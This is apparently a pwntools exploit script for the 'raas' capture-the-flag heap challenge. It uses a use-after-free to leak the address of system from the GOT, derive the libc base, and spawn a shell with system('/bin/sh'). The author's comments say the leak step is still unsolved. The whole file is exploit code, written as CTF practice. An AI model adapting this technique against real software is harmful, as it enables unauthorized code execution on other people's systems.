#!/usr/bin/env python
# -*- coding: utf-8 -*-
# 
from pwn import *
context.log_level = 'debug'
context.terminal = ['deepin-terminal', '-x', 'sh', '-c']
io = process('./raas')
# raw_input('debug >')
# gdb.attach(io, 'b * 0x8048a6e')
# io = remote('hackme.inndy.tw', 7719)
elf = ELF('./raas')
libc = ELF('../libc-2.23.so.i386')
bsh_libc = libc.search('/bin/sh').next()
sys_libc = libc.sym['system']

sys_got = elf.got['system']
str_print = elf.sym['rec_str_print']
str_free = elf.sym['rec_str_free']


def add(index, lenth, value):
    io.recvuntil('Act > ')
    io.sendline('1')
    io.sendlineafter('Index > ', str(index))
    io.sendlineafter('Type > ', '2')
    io.sendlineafter('Length > ', str(lenth))
    # how to make it input without problem?
    io.sendafter('Value > ', value)


def delete(index):
    io.sendlineafter('Act > ', '2')
    io.sendlineafter('Index > ', str(index))


def show(index):
    io.recvuntil('Act > ')
    io.sendline('3')
    io.sendlineafter('Index > ', str(index))


if __name__ == '__main__':
    add(0, 64, 'a' * 63)
    add(1, 64, 'b' * 64)
    add(2, 64, 'c' * 64)
    delete(0)
    delete(1)
    add(3, 12, p32(str_print) + p32(str_free) + p32(sys_got))
    # to leak the address of system,then get libc base to get everything
    show(0)
    # program meets end while input, waiting to solve
    # In theory, it should leak the addr and then get shell
    io.recvuntil('Value=')
    sys_addr = u32(io.recvuntil(')',drop = True))
    success('system addr -> {:#x}'.format(sys_addr))
    libc_base = sys_addr - sys_libc
    bsh_addr = bsh_libc + libc_base
    success('libc base -> {:#x}'.format(libc_base))
    success('binsh -> {:#x}'.format(bsh_addr))

    delete(3)
    payload = p32(bsh_addr) + p32(sys_addr) + 'get'
    add(4,12,payload)
    delete(4)

    io.interactive()
    io.close()

